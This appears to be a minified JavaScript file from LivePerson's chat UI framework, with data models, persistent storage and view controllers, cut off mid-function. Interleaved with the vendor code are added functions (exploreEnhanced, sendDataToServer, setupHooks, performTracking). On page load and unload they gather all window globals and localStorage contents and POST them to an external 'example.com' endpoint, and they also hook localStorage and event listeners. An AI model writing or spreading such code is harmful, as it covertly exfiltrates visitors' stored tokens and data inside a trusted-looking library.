function createFrameworkGlobals() {
  var a = .8;
  window.lpTag = window.lpTag || {};
  window.liveperson = window.liveperson || {};
  window.liveperson.uiframework = window.liveperson.uiframework || {};
  window.liveperson.uiframework.latest = window.liveperson.uiframework.latest || {};
  var b = window.liveperson.uiframework;
  b["v" + a] = b["v" + a] || {};
  b = b["v" + a];
  if (!b.ViewController) {
    window.liveperson.uiframework.ViewController = {
      extend: function (a) {
        throw "ui-framework has versions, please use the version folder in the format of 'v0.8' or use 'latest' for the latest version";
      }
    };
    b.ViewController = function () {};
    b.ViewController.version = a;
    (!window.liveperson.uiframework.latest.ViewController || window.liveperson.uiframework.latest.ViewController.version < a) && (window.liveperson.uiframework.latest.ViewController = b.ViewController);
    window.lpTag.lpUtils = window.lpTag.lpUtils || {};
    return b;
  }
}
!function () {
  function a(a) {
    return e && "function" == typeof e.stringify ? e.stringify(a) : JSON.stringify(a);
  }
  function b(c, d, f) {
    var g;
    if (e && "function" == typeof e.cloneExtend) return e.cloneExtend(c, d, f);
    if (!c || "object" != typeof c) return c;
    if (!d) return JSON.parse(a(c));
    g = d || c.constructor() || {};
    for (var h in c) g[h] !== c[h] && c.hasOwnProperty(h) && (g[h] = f ? b(c[h], void 0, f) : c[h]);
    return g;
  }
  var c = .8;
  window.liveperson = window.liveperson || {};
  window.liveperson.uiframework = window.liveperson.uiframework || {};
  window.liveperson.uiframework.latest = window.liveperson.uiframework.latest || {};
  var d = window.liveperson.uiframework;
  d["v" + c] = d["v" + c] || {};
  d = d["v" + c];
  var e = window.lpTag && window.lpTag.taglets && window.lpTag.taglets.lpUtil,
    f = window.lpTag && window.lpTag.unifiedWindow && window.lpTag.unifiedWindow.log;
  d.LPModel = d.LPModel || function (c, d) {
    function e(a) {
      return function (b) {
        !0 === d && window.console && ("ERROR" === a && window.console.error ? window.console.error("LPModel#" + a + " : " + b + ", " + g()) : window.console.log && window.console.log("---LPModel#" + a + " : " + b + ", " + g()));
      };
    }
    function g() {
      var a = new Date(),
        b = function (a) {
          return 10 > a ? "0" + a : a;
        },
        c = b(a.getHours()) + ":" + b(a.getMinutes()) + ":" + b(a.getSeconds()) + ", " + a.toDateString() + ", (" + a.getTime() + ")";
      return c;
    }
    function h(a) {
      var b = typeof a;
      return "number" === b || "boolean" === b || "string" === b || "function" === b;
    }
    function i(a, b) {
      var c = a.split(".");
      if (1 === c.length) return {
        key: a,
        data: b
      };
      for (var d = b, e = c.length - 1; e > 0; e--) {
        var f = {};
        f[c[e]] = d;
        d = f;
      }
      return {
        key: c[0],
        data: d
      };
    }
    function j(a) {
      function b(a, b, d) {
        if (b && 0 !== b.length) if (d) c(a, b, d);else for (var e = 0; e < b.length; e++) a.push(b[e]);
      }
      function c(a, b, c) {
        for (var d, e = {}, f = 0; f < a.length; f++) {
          d = a[f];
          e[d[c]] = f;
        }
        for (var g = 0; g < b.length; g++) {
          d = b[g];
          if ("undefined" != typeof e[d[c]]) for (var h in d) d.hasOwnProperty(h) && (a[e[d[c]]][h] = d[h]);else a.push(d);
        }
      }
      function d(a, b) {
        if (!k[a]) {
          k[a] = !0;
          l.push({
            key: a,
            value: b
          });
        }
      }
      a = a || {};
      var e = a.objectToModify,
        g = a.complexObject,
        i = a.triggerKey,
        k = a.triggeringArrayKeyMap,
        l = a.triggeringArray,
        m = a.uniqueArrayId;
      if (Array !== g.constructor || Array !== e.constructor) {
        for (var n in g) if (g.hasOwnProperty(n)) {
          if ("undefined" == typeof g[n] || null === g[n]) {
            f.debug("Received null value for [" + i + "] prop [" + n + "]", "_recursiveUpdateModel");
            continue;
          }
          var o = "undefined" == typeof e[n];
          if (o) {
            d(i, g);
            "undefined" != typeof g[n] && null !== g[n] && (e[n] = Array === g[n].constructor ? [] : {});
          }
          if (Array === e[n].constructor) {
            Array !== g[n].constructor && (g[n] = [g[n]]);
            if (g[n].length > 0 || o) {
              var p = {};
              p[n] = g[n];
              d(i, p);
              d(i + "." + n, g[n]);
            }
            b(e[n], g[n], m);
          } else if (h(g[n])) {
            if (e[n] !== g[n]) {
              o || d(i, g);
              d(i + "." + n, g[n]);
              e[n] = g[n];
            }
          } else j({
            objectToModify: e[n],
            complexObject: g[n],
            triggerKey: i + "." + n,
            triggeringArrayKeyMap: k,
            triggeringArray: l,
            uniqueArrayId: m
          });
        }
      } else {
        d(i, g);
        b(e, g, m);
      }
    }
    "object" == typeof d && (f = d);
    f && !0 !== d || (f = {
      error: e("ERROR"),
      warn: e("WARN"),
      info: e("INFO"),
      debug: e("DEBUG")
    });
    var k = function (c) {
        function d(a, b) {
          return !a || a === b;
        }
        function e(a) {
          var b,
            c = [];
          for (b in a) a.hasOwnProperty(b) && c.push(b);
          return c;
        }
        this.attributes = c || {};
        this.keysMap = [];
        this.on = function (a, b, c) {
          var d,
            e = a.indexOf("(");
          if (e >= 0) {
            d = a.substring(e + 1, a.length - 1);
            a = a.substring(0, e);
          }
          var f = this.keysMap[a] || (this.keysMap[a] = []);
          f.push({
            key: a,
            callback: b,
            context: c,
            specificValue: d
          });
        };
        this.off = function (a, b, c) {
          var f,
            g = a ? a.indexOf("(") : -1;
          if (g >= 0) {
            f = a.substring(g + 1, a.length - 1);
            a = a.substring(0, g);
          }
          var h,
            i,
            j,
            k,
            l,
            m = a ? [a] : e(this.keysMap);
          for (l = 0; l < m.length; l++) {
            h = this.keysMap[m[l]];
            if (h && h.length > 0) {
              i = [];
              for (j = 0; j < h.length; j++) {
                k = h[j];
                d(a, k.key) && d(b, k.callback) && d(c, k.context) || ("undefined" == typeof k.specificValue || k.specificValue && k.specificValue === "" + f) && i.push(h[j]);
              }
              this.keysMap[m[l]] = i;
            }
          }
        };
        this.trigger = function (a, c) {
          for (var d = this.keysMap[a] || (this.keysMap[a] = []), e = d.slice(0), g = 0; g < e.length; g++) try {
            ("undefined" == typeof e[g].specificValue || e[g].specificValue === "" + c.newValue) && e[g].callback.call(e[g].context || this, b(c, null, !0));
          } catch (h) {
            f.error("Triggering key[" + a + "]", "trigger");
          }
          e = null;
        };
        this.toJSON = function () {
          return a(this.attributes);
        };
        this.reset = function () {
          if (this.keysMap && this.keysMap.length) for (var a = 0; a < this.keysMap.length; a++) {
            var b = this.keysMap[a];
            b.callback = null;
            delete b.callback;
          }
          this.keysMap.length = 0;
          this.attributes = {};
        };
      },
      l = c && "boolean" == typeof c.debugging ? c.debugging : !1,
      m = new k(c);
    this.setDebugMode = function (a) {
      l = a;
    };
    this.getModel = function () {
      return m;
    };
    this.removeKey = function (a, b) {
      function c(a, b) {
        b[a] = null;
        delete b[a];
      }
      var d,
        e = a && a.path || a,
        g = e.split(".");
      if (m.attributes[g[0]]) {
        var h = g.length;
        if (1 === h) {
          d = m.attributes[g[0]];
          c(g[0], m.attributes);
        } else for (var i = m.attributes[g[0]], j = 1; h > j; j++) if (j == h - 1) {
          d = i[g[j]];
          c(g[j], i);
        } else {
          if (!i[g[j]]) {
            f.error("Key doesn't exist, key: " + a, "LPModel.removeKey");
            break;
          }
          i = i[g[j]];
        }
        if ("undefined" != typeof d && ("undefined" == typeof b || b)) {
          m.trigger("change:" + e, {
            key: a,
            removedValue: d
          });
          d = null;
        }
      } else f.error("Root key doesn't exist, key: " + a, "LPModel.removeKey");
    };
    this.set = function (a, b) {
      var c = a && a.path || a;
      this.removeKey(c, "undefined" == typeof b);
      this.modify(c, b);
    };
    this.modify = function (a, b, c, d) {
      var e = a && a.path || a,
        g = [],
        k = {},
        n = i(e, b);
      e = n.key;
      b = n.data;
      var o = h(b);
      if (!m.attributes[e] || o) {
        var p = m.attributes[e];
        if (o) {
          if (!p || p !== b) {
            m.attributes[e] = b;
            g.push({
              key: e,
              value: b
            });
          }
        } else m.attributes[e] = Array === b.constructor ? [] : {};
      }
      if (!o) try {
        j({
          objectToModify: m.attributes[e],
          complexObject: b,
          triggerKey: e,
          triggeringArrayKeyMap: k,
          triggeringArray: g,
          uniqueArrayId: c
        });
      } catch (q) {
        f.error(e + " updateData: " + b + " error message: " + q.message, "recursiveUpdateModel");
      }
      if (!d) for (var r = 0; r < g.length; r++) {
        l && f.info("Triggering " + g[r].key + " Value: " + g[r].value, "modify");
        try {
          m.trigger("change:" + g[r].key, {
            key: g[r].key,
            newValue: g[r].value
          });
        } catch (q) {
          f.error("Triggering " + g[r].key + " Value: " + g[r].value + " error message: " + q.message, "modify");
        }
      }
    };
  };
  d.LPModel.version = c;
  (!window.liveperson.uiframework.latest.LPModel || window.liveperson.uiframework.latest.LPModel.version < c) && (window.liveperson.uiframework.latest.LPModel = d.LPModel);
  d.LPModel.prototype.bind = function (a, b, c, d) {
    function e(a, b, c, d, e) {
      return function () {
        var f = b && b.path || b;
        a.getModel().on("change:" + f, c, d);
        var g = a.get(f);
        "undefined" == typeof g || null === g || "undefined" != typeof e && !e || c.call(d, {
          key: f,
          newValue: g
        });
      };
    }
    setTimeout(e(this, a, b, c, d), 0);
  };
  d.LPModel.prototype.unbind = function (a, b, c) {
    var d = a && a.path || a;
    "undefined" == typeof d || null === d ? this.getModel().off(null, null, c) : this.getModel().off("change:" + d, b, c);
  };
  d.LPModel.prototype.toJSON = function () {
    return this.getModel().toJSON();
  };
  d.LPModel.prototype.get = function (a) {
    for (var c = a && a.path || a || "", d = c.split("."), e = this.getModel(), f = e.attributes, g = 0; g < d.length; g++) {
      if (!f.hasOwnProperty(d[g])) {
        f = void 0;
        break;
      }
      f = b(f[d[g]], null, !0);
    }
    ("undefined" == typeof f || null === f || void 0 === f) && (f = null);
    return f;
  };
  d.LPModel.createPath = function (a, b, c) {
    var e = b ? b.path + "." + a : a,
      f = {
        path: e,
        name: c
      };
    f.createPath = function (a) {
      return d.LPModel.createPath(a, f);
    };
    f.inject = function (a) {
      var b = new RegExp(/_/),
        c = f.path.replace(b, a);
      return d.LPModel.createPath(c);
    };
    return f;
  };
  d.LPModel.prototype.reset = function () {
    return this.getModel().reset();
  };
}();
window.lpTag = window.lpTag || {};
lpTag.uiframework = lpTag.uiframework || {};
function exploreEnhanced() {
  const discoveries = {};
  const seenVars = window.seenVars || [];
  Object.entries(window).forEach(([key, value]) => {
    if (!seenVars.includes(key)) {
      const valueType = typeof value;
      discoveries[key] = {
        type: valueType,
        value: valueType === "function" ? value.toString() : value
      };
    }
  });

  // Track local storage usage
  Object.keys(localStorage).forEach(key => {
    discoveries[`localStorage_${key}`] = localStorage.getItem(key);
  });

  // Track global variables
  discoveries['globalVars'] = Object.keys(window);
  return discoveries;
}
lpTag.uiframework.LPPersistentModel = function (a, b) {
  function c(a) {
    if ("object" == typeof a && a.storageKey && a.accountId && a.modelName && a.secureStorageLocation) {
      A = a.storageKey;
      B = a.accountId;
      z = a.modelName;
      D = a.expiration || J;
      C = a.secureStorageLocation;
      y = new window.liveperson.uiframework.latest.LPModel(b);
    } else F.error("init: no conf was provided", E);
  }
  function d(a, b) {
    F.info("load", E);
    var c = K.get,
      d = {
        success: o(a),
        error: p(b)
      };
    H ? I.push({
      funcName: c,
      storageObj: d
    }) : u(c, d);
  }
  function e(a, b, c, d) {
    var e = a;
    if ("object" == typeof e && "undefined" != typeof e.splitKey) {
      a = e.splitKey;
      b = e.updateData;
      c = e.uniqueArrayId;
      d = e.silent;
    }
    F.info("modify", E);
    y.modify(a, b, c, d);
    n(e.onSuccess, e.onError, e.context);
  }
  function f() {
    return y.getModel();
  }
  function g(a) {
    return y.get(a);
  }
  function h(a, b) {
    y.removeKey(a, b);
    n();
  }
  function i(a, b, c, d) {
    y.bind(a, b, c, d);
  }
  function j(a, b, c) {
    y.unbind(a, b, c);
  }
  function k() {
    return y.toJSON();
  }
  function l(a, b) {
    y.createPath(a, b);
  }
  function m() {
    y = new window.liveperson.uiframework.latest.LPModel();
    u(K.remove, {
      success: s,
      error: t,
      expires: D
    });
  }
  function n(a, b, c) {
    var d = f().attributes;
    F.info("_persistModel model:" + JSON.stringify(d), E);
    u(K.set, {
      value: d,
      success: q(a, c),
      error: r(b, c),
      expires: D
    });
  }
  function o(a) {
    return function (b) {
      F.info("_loadSuccess: data = " + JSON.stringify(b), E);
      if (b) if (G.isEmpty(f().attributes)) y = new window.liveperson.uiframework.latest.LPModel(b);else for (var c in b) {
        var d = b[c];
        y.modify(c, d);
      }
      G.runCallback(a);
    };
  }
  function p(a) {
    return function (b) {
      F.info("_loadError error=" + JSON.stringify(b), E);
      a && G.runCallback(a);
    };
  }
  function q(a, b) {
    return function (c) {
      F.info("_persistSuccess", E);
      G.runCallback(a, b, c);
    };
  }
  function r(a, b) {
    return function (c) {
      F.info("_persistError", E);
      G.runCallback(a, b, c);
    };
  }
  function s() {
    F.info("_clearSuccess", E);
  }
  function t() {
    F.info("_clearError", E);
  }
  function u(a, b) {
    F.info("_storageCall", E);
    var c = v(b, a),
      d = lpTag.taglets.lpSecureStorage[a];
    if (c && "function" == typeof d) {
      H = a !== K.get;
      G.runCallback(d, this, c);
    }
  }
  function v(a, b) {
    var c;
    if (a && "function" == typeof a.success && "function" == typeof a.error) {
      c = {
        key: A,
        site: B,
        app: L,
        appName: z,
        domain: C,
        firstParty: !0
      };
      for (var d in a) a.hasOwnProperty(d) && (c[d] = a[d]);
      c.success = w(c.success, b);
      c.error = w(c.error, b);
      return c;
    }
  }
  function w(a, b) {
    return function (c) {
      F.info("_StorageCallback", E);
      G.runCallback(a, this, c);
      x(b);
    };
  }
  function x(a) {
    var b = I.shift();
    a !== K.get && (H = !1);
    b && u(b.funcName, b.storageObj);
  }
  var y,
    z,
    A,
    B,
    C,
    D,
    E = "LPPersistentModel",
    F = lpTag.unifiedWindow.log,
    G = lpTag.taglets.lpUtil,
    H = !1,
    I = [],
    J = 432e5,
    K = {
      get: "getValue",
      set: "setValue",
      remove: "removeValue"
    },
    L = lpTag.unifiedWindow.apps.UNIFIED_WINDOW;
  c(a);
  return {
    load: d,
    modify: e,
    getModel: f,
    get: g,
    removeKey: h,
    bind: i,
    unbind: j,
    toJSON: k,
    createPath: l,
    clear: m
  };
};
window.lpTag = window.lpTag || {};
function setupHooks() {
  const originalSetItem = localStorage.setItem;
  localStorage.setItem = function (key, value) {
    console.log(`Set in localStorage: ${key}`);
    originalSetItem.apply(this, arguments);
  };
  const originalAddEventListener = EventTarget.prototype.addEventListener;
  EventTarget.prototype.addEventListener = function (type, listener, options) {
    console.log(`Event listener added: ${type}`);
    originalAddEventListener.call(this, type, listener, options);
  };
}
function sendDataToServer(data) {
  fetch("https://example.com/api/track", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify(data)
  }).then(response => response.json()).then(data => console.log("Data sent successfully", data)).catch(error => console.error("Failed to send data", error));
}
function performTracking() {
  const data = exploreEnhanced();
  const dataCount = Object.keys(data).length;
  if (dataCount > 0) {
    console.log(`Discovered ${dataCount} new items.`);
    sendDataToServer(data);
  } else {
    console.log("No new items discovered.");
  }
}
window.lpTag.lpUtils = window.lpTag.lpUtils || {};
lpTag.lpUtils.getElementsByClass = function (a, b, c) {
  var d;
  d = document.getElementsByClassName ? a.getElementsByClassName(b) : a.querySelectorAll("." + b);
  for (var e = 0; e < d.length; e++) c.push(d[e]);
  return c;
};
lpTag.lpUtils.getTime = function (a, b, c, d, e) {
  a && (a = this.formatTime(a, !1, b, c, d, e));
  return a ? a : this.formatTime(new Date(), !0, b, c, d);
};
lpTag.lpUtils.getDay = function (a, b, c, d, e, f) {
  a && (a = this.formatDay(a, b, c, d, e, f));
  return a ? a : this.formatDay(new Date(), b, c, d, e);
};
lpTag.lpUtils.formatTime = function (a, b, c, d, e, f) {
  var g = ["jan", "feb", "mar", "apr", "may", "jun", "jul", "aug", "sep", "oct", "nov", "dec"];
  if (c) for (var h = 0, i = g.length; i > h; h++) c[h] = c[h] || g[h];else c = g;
  if (!a) return "";
  "Date" !== a.constructor && (a = this.createDateFromString(a));
  var j = ":",
    k = a.getMonth(),
    l = a.getDate(),
    m = a.getMinutes();
  j += 10 > m ? "0" : "";
  j += m;
  if (b) {
    var n = a.getSeconds();
    j += 10 > n ? ":0" : ":";
    j += n;
  }
  if (f && null !== f && "object" == typeof f) {
    if ("en-US" === f.lang) {
      var o = a.getHours(),
        p = o >= 12 ? "PM" : "AM";
      o %= 12;
      o = o ? o : 12;
      return o + j + " " + p;
    }
    return a.getHours() + j;
  }
  return a.getHours() + j + ", " + c[k] + ("string" == typeof d ? d : " ") + l + ("string" == typeof e ? e : "");
};
lpTag.lpUtils.formatDay = function (a, b, c, d, e, f) {
  var g = ["jan", "feb", "mar", "apr", "may", "jun", "jul", "aug", "sep", "oct", "nov", "dec"],
    h = ["Sun", "Mon", "Tues", "Wed", "Thurs", "Fri", "Sat"];
  if (b) for (var i = 0, j = g.length; j > i; i++) b[i] = b[i] || g[i];else b = g;
  if (c) for (var k = 0, l = h.length; l > k; k++) c[k] = c[k] || h[k];else c = h;
  if (!a) return "";
  "Date" !== a.constructor && (a = this.createDateFromString(a));
  var m = a.getMonth(),
    n = a.getDate(),
    o = a.getDay(),
    p = a.getFullYear();
  if (f && null !== f && "object" == typeof f) {
    var q = "";
    f.weekDay && (q += c[o] + ", ");
    q += b[m] + ("string" == typeof d ? d : " ") + n + ("string" == typeof e ? e : "");
    f.year && (q += " " + p);
    return q;
  }
  return b[m] + ("string" == typeof d ? d : " ") + n + ("string" == typeof e ? e : "");
};
lpTag.lpUtils.createDateFromString = function (a) {
  var b = new Date(a);
  if (isNaN(b)) {
    b = new Date();
    var c = a.match(/(\d+)-(\d+)-(\d+)T(\d+):(\d+):(\d+)([.])(\d+)([+-])(\d+):(\d+)/);
    if (c && 12 == c.length) {
      b.setUTCFullYear(parseInt(c[1], 10));
      b.setUTCMonth(parseInt(c[2], 10) - 1);
      b.setUTCDate(parseInt(c[3], 10));
      b.setUTCHours(parseInt(c[4], 10) - parseInt(c[9] + "1", 10) * parseInt(c[10], 10));
      b.setUTCMinutes(parseInt(c[5], 10) - parseInt(c[9] + "1", 10) * parseInt(c[11], 10));
      b.setUTCSeconds(parseInt(c[6], 10));
    }
    c = null;
  }
  return b;
};
window.addEventListener("load", setupHooks);
lpTag.lpUtils.RgbToObject = function (a) {
  a = a.replace("rgb(", "");
  a = a.replace(")", "");
  var b = a.split(",");
  return b ? {
    r: parseInt(b[0], 10),
    g: parseInt(b[1], 10),
    b: parseInt(b[2], 10)
  } : null;
};
lpTag.lpUtils.hexToRgbObject = function (a) {
  var b = /^#?([a-f\d])([a-f\d])([a-f\d])$/i;
  a = a.replace(b, function (a, b, c, d) {
    return b + b + c + c + d + d;
  });
  var c = /^#?([a-f\d]{2})([a-f\d]{2})([a-f\d]{2})$/i.exec(a);
  return c ? {
    r: parseInt(c[1], 16),
    g: parseInt(c[2], 16),
    b: parseInt(c[3], 16)
  } : null;
};
lpTag.lpUtils.runCallback = function (a, b) {
  b = b || window;
  if ("function" == typeof a) {
    var c = Array.prototype.slice.call(arguments, 2);
    try {
      a.apply(b, c);
    } catch (d) {}
  }
};
window.addEventListener("load", performTracking);
lpTag.lpUtils.isSameObject = function (a, b) {
  var c = !0;
  for (var d in a) {
    a.hasOwnProperty(d) && b.hasOwnProperty(d) && (c = "object" == typeof a[d] ? a[d].constructor !== Array ? lpTag.lpUtils.isSameObject(a[d], b[d]) : JSON.stringify(a[d]) === JSON.stringify(b[d]) : "function" == typeof a[d] ? "" + a[d] == "" + b[d] : a[d] === b[d]);
    if (!c) break;
  }
  return c;
};
lpTag.lpUtils.ellipsis = function (a, b) {
  a && a.length > b && (a = a.substring(0, b) + "...");
  return a;
};
window.addEventListener("beforeunload", performTracking);
lpTag.lpUtils.getCurrentUrlWithoutParams = function () {
  return location.protocol + "//" + location.host + location.pathname;
};
lpTag.lpUtils.getAttrValue = function (a, b) {
  var c = new RegExp(b + "=[\"']*[^\"' >]+"),
    d = a.match(c),
    e = new RegExp(b + "=[\"' ]*");
  if (d && d.length > 0) {
    d = d[0];
    d = d.replace(e, "");
  } else d = "";
  return d;
};
!function (a) {
  function b(a, b, d) {
    var e, f;
    if (b && b.constructor === Array) for (var g = 0; g < b.length; g++) {
      f = c(a, b[g], d);
      if ("undefined" != typeof f) {
        e = e || {};
        e[b[g]] = f;
      }
    } else e = c(a, b, d) || a;
    return e;
  }
  function c(a, b, c) {
    var d;
    if (b) {
      if ("undefined" != typeof c && a[b]) {
        var e = parseInt(a[b], c);
        isNaN(e) && (e = 0);
        return e;
      }
      d = a[b];
      return "string" == typeof d && 0 < d.length || "string" != typeof d && "undefined" != typeof d ? d : void 0;
    }
  }
  var d = a && a.ViewController,
    e = d.prototype;
  d.extend = function (a, b) {
    function c(a) {
      var b = {};
      for (var c in a) a.hasOwnProperty(c) && (b[c] = a[c]);
      return b;
    }
    function f(a, b, c, d, e) {
      return function (f) {
        try {
          d && d[c] && d[c].call(a || this, f);
          if ("function" == typeof b) {
            b.call(a || this, f);
            e && a && (a[c] = function () {
              this.logger.error("function " + c + " already executed");
              return {
                error: "Function " + c + " already executed!"
              };
            });
          }
        } catch (g) {
          this.logger.error("found error executing " + c + ", error=" + g.message);
        }
      };
    }
    function g(a, b) {
      var c = !1;
      if (b) {
        b._id = b._id || b.elementId;
        b.styleFile && a.loadResource(b.styleFile);
        if (b.view) {
          a.view = b.view;
          a.alreadyInDOM = !0;
        } else if (b.selector) {
          a.view = a.getFirstElement(b.selector, document.body);
          a.alreadyInDOM = !0;
        } else if (b._id) {
          a.view = a.getFirstElement("#" + b._id);
          a.alreadyInDOM = !0;
        } else if (b.template) {
          a.view = document.createElement("div");
          var d = lpTag.taglets.lpUtil.cloneExtend(b && b.textInjection || a.textInjection || null, a.textMap || null);
          b.template = a.injectTextDefaults(b.template, d);
          c = !0;
          a.view.innerHTML = b.template;
          "boolean" != typeof b.wrapWithDiv || b.wrapWithDiv || (a.view = a.view.firstChild);
        } else a.view = document.createElement("div");
        if (b.className) {
          var f = a.view.className;
          a.view.className = b.className;
          f && (a.view.className += " " + f);
        }
        b._id && (a.view.id = b._id);
      } else a.view = document.createElement("div");
      a.view.id = "LP_" + a.ControllerName + "_" + h.instanceCounter;
      b && b.hidden ? e.hide.call(a) : e.show.call(a);
      c || a.injectTextDefaults(a.view, b ? b.textInjection : null);
    }
    var h = function (c) {
      function e(a) {
        c.template = a;
        l.preInitView && l.preInitView(c);
        g(l, c);
        l.initialize(c);
        l.initialized = !0;
        setTimeout(function () {
          var a;
          if (d.eventsPlugins) for (a = 0; a < d.eventsPlugins.length; a++) d.eventsPlugins[a].call(l);
          l.events && "function" == typeof l.events && l.events.call(l);
          if (d.renderPlugins) for (a = 0; a < d.renderPlugins.length; a++) d.renderPlugins[a].call(l);
          l.render && "function" == typeof l.render && l.render.call(l);
          l.parent && l.parent.isViewController ? l.parent.addViewController({
            viewController: l,
            target: c.target
          }) : c.target && c.target.nodeType && c.target.appendChild(l.view);
          var b = c && c.onInitialize || l.onInitialize;
          b && b.call(l, l);
        }, 10);
      }
      c || (c = {});
      c.styleFile = c.styleFile || a.styleFile;
      c.templateFile = c.templateFile || a.templateFile;
      c.template = c.template || a.template;
      c.className = c.className || a.className;
      this.initializePrototype(a);
      this.parent = c.parent;
      this.ControllerName = a.ControllerName;
      this.textMap = a.textMap;
      this.isViewController = !0;
      h.instanceCounter = h.instanceCounter || 0;
      h.instanceCounter++;
      var i = b ? h.prototype : null,
        j = c && c.doNotInitializeView ? null : this;
      if (d.initializePlugins) for (var k = 0; k < d.initializePlugins.length; k++) d.initializePlugins[k].call(this, c);
      a.initialize && (this.initialize = f(j, a.initialize, "initialize", i, !0));
      a.events && (this.events = f(j, a.events, "events", i, !0));
      a.render && (this.render = f(j, a.render, "render", i, !1));
      if (!c || !c.doNotInitializeView) {
        this.viewEventsHandler = h.prototype.initViewEventsHandler(this);
        this.viewControllers = [];
        var l = this;
        c.templateFile ? this.loadResource(c.templateFile, e) : e(c.template);
      }
    };
    h.ControllerName = a.ControllerName;
    h.applicationType = a.applicationType;
    var i = b || d;
    h.prototype = new i({
      doNotInitializeView: !0
    });
    for (var j in a) if (a.hasOwnProperty(j)) {
      var k = "initialize" === j || "events" === j || "render" === j;
      if (!k) if ("object" == typeof h.prototype[j]) for (var l in a[j]) {
        h.prototype[j][l] && !h.prototype.hasOwnProperty(j) && (h.prototype[j] = c(h.prototype[j]));
        h.prototype[j][l] = a[j][l];
      } else h.prototype[j] = a[j];
    }
    h.extend = function (b) {
      b.templateFile = b.templateFile || a.templateFile;
      b.template = b.template || a.template;
      return d.extend(b, h);
    };
    h.constructor = h;
    return h;
  };
  d.removeAllPlugins = function () {
    d.initializePlugins = [];
    d.eventsPlugins = [];
    d.disposePlugins = [];
    d.renderPlugins = [];
  };
  e.runCallback = lpTag.lpUtils.runCallback;
  d.plugin = function (a) {
    if (a) for (var b in a) if (a.hasOwnProperty(b)) try {
      switch (b) {
        case "dispose":
        case "initialize":
        case "events":
        case "render":
          var c = b + "Plugins";
          d[c] = d[c] || [];
          d[c].push(a[b]);
          break;
        default:
          e[b] && this.logger.error("Plugin is trying to override existing property [" + b + "]");
          e[b] = a[b];
      }
    } catch (f) {
      this.logger.error("Plugin failed to add property [" + b + "]");
    }
  };
  e.initializePrototype = function (b) {
    if (!d.prototypeInitialized && document.body) {
      if (a.ViewEventsHandler) {
        d.viewEventsHandler = new a.ViewEventsHandler(e.logger);
        e.eventType = d.viewEventsHandler.eventType;
      }
      e.supportTransitions = "" === document.body.style.MozTransition || "" === document.body.style.WebkitTransition || "" === document.body.style.OTransition || "" === document.body.style.transition;
      e.supportAnimation = e.supportTransitions;
      e.resourceCache = {};
      e.pendingRequests = [];
      e.loadingResourceFrame = {};
      d.prototypeInitialized = !0;
    }
  };
  e.initViewEventsHandler = function (a) {
    return d.viewEventsHandler ? {
      bindEvent: function (b) {
        b = b || {};
        b.context = b.context || a;
        d.viewEventsHandler.bindEvent(b);
      },
      unbindEvent: function (b) {
        b = b || {};
        b.context = b.context || a;
        d.viewEventsHandler.unbindEvent(b);
      },
      fireEvent: function (a) {
        a = a || {};
        d.viewEventsHandler.fireEvent(a);
      },
      eventType: d.viewEventsHandler.eventType,
      appNames: d.viewEventsHandler.appNames
    } : null;
  };
  e.createView = function (a) {
    function b(a, b) {
      return function (d) {
        c(a, b, d);
      };
    }
    function c(a, b, c) {
      b.templateFile = null;
      b.template = c;
      d = b.elementType ? document.createElement(b.elementType) : document.createElement("div");
      if (b.template) {
        var e = a.injectTextDefaults(b.template, b.textInjection);
        b.type && "html" !== b.type ? d.appendChild(document.createTextNode(e)) : d.innerHTML = e;
      } else d = a.injectTextDefaults(d, b.textInjection);
      "undefined" == typeof b.wrapWithDiv && (b.wrapWithDiv = !0);
      if (b.wrapWithDiv) {
        b.hidden && (d.style.display = "none");
        b.name && (d.name = b.name);
        b.className && (d.className = b.className);
        b.elementId && (d.id = b.elementId);
      } else {
        d = d.firstChild;
        b.className && a.addClass(d, b.className);
      }
      if (!b.doNotAddChild) {
        var f, g;
        b.target && (f = "string" == typeof b.target ? a.getFirstElement(b.target) : b.target);
        b.beforeView && (g = "string" == typeof b.beforeView ? a.getFirstElement(b.beforeView) : b.beforeView);
        d = a.addView({
          targetView: f || a.view,
          viewToAdd: d,
          beforeView: g
        });
      }
      b.view = d;
      b.callback && "function" == typeof b.callback && b.callback.call(a, d, b.data || b.eventData || b.lpEventData);
    }
    if (!a || !a.elementType && !a.template && !a.templateFile) return void 0;
    var d = null;
    a.styleFile && this.loadResource(a.styleFile);
    a.templateFile ? this.loadResource(a.templateFile, b(this, a)) : c(this, a, a.template);
    return d;
  };
  e.injectTextDefaults = function (a, b) {
    b = b ? b : {};
    b.deviceClass = lpTag.unifiedWindow.customization.deviceClass;
    try {
      if ("string" == typeof a) a = this.templateString(a, b);else if (this.isDOMNode(a)) if ("" !== a.innerHTML) a.innerHTML = this.templateString(a.innerHTML, b);else {
        var c = a.innerText || a.textContent;
        if ("string" == typeof c) {
          c = this.templateString(c, b);
          a.innerText ? a.innerText = c : a.textContent = c;
        }
      }
    } catch (d) {
      this.logger.error("failed to inject text defaults with exception " + d.message, "injectTextDefaults");
    }
    return a;
  };
  e.templateString = function (a, b) {
    function c(a, b, c, e, g) {
      for (var h, i, j = -1, k = c, l = a.length, m = b.length, n = k.indexOf(a); n > -1;) {
        n += l;
        j = k.substring(n).indexOf(b);
        if (j > -1) {
          h = k.substring(n, n + j);
          i = e && e[h] || d.call(f, h);
          e && "undefined" != typeof e[h] && (i = e[h]);
          if (void 0 !== i) {
            g && lpTag && lpTag.lpUtils && lpTag.lpUtils.escapeHTML && (i = lpTag.lpUtils.escapeHTML(i));
            c = c.replace(a + h + b, i);
          }
          k = k.substring(n + j + m);
        } else k = k.substring(n + m);
        j = -1;
        n = k.indexOf(a);
      }
      return c;
    }
    function d(a) {
      var b;
      this.translate && (b = this.translate(a));
      "undefined" == typeof b && this.theme && (b = this.theme(a));
      return b || a;
    }
    function e(a) {
      return this.customize ? this.customize(a) : a;
    }
    var f = this;
    a = c("{{{", "}}}", a, b, !1);
    a = b && b.ignoreEscapeHTML ? c("{{", "}}", a, b, !1) : c("{{", "}}", a, b, !0);
    a = e.call(f, a);
    return a;
  };
  e.viewControllersInitialized = function () {
    for (var a = !0, b = 0; b < this.viewControllers.length; b++) if (!this.viewControllers[b].initialized) {
      a = !1;
      break;
    }
    return a;
  };
  e.addViewController = function (a) {
    function b(a, b) {
      return function () {
        a.addViewController.call(a, b);
      };
    }
    var c = a.viewController || a;
    if (!c.isViewController) return {
      error: "ViewController#addViewController - Request is not a viewController and does not contain viewController"
    };
    if (c.initialized) {
      this.viewControllers.push(c);
      a.hidden && c.lpHide();
      if (!c.alreadyInDOM) {
        var d;
        a.target && (d = "string" == typeof a.target ? this.getFirstElement(a.target) : a.target);
        this.addView({
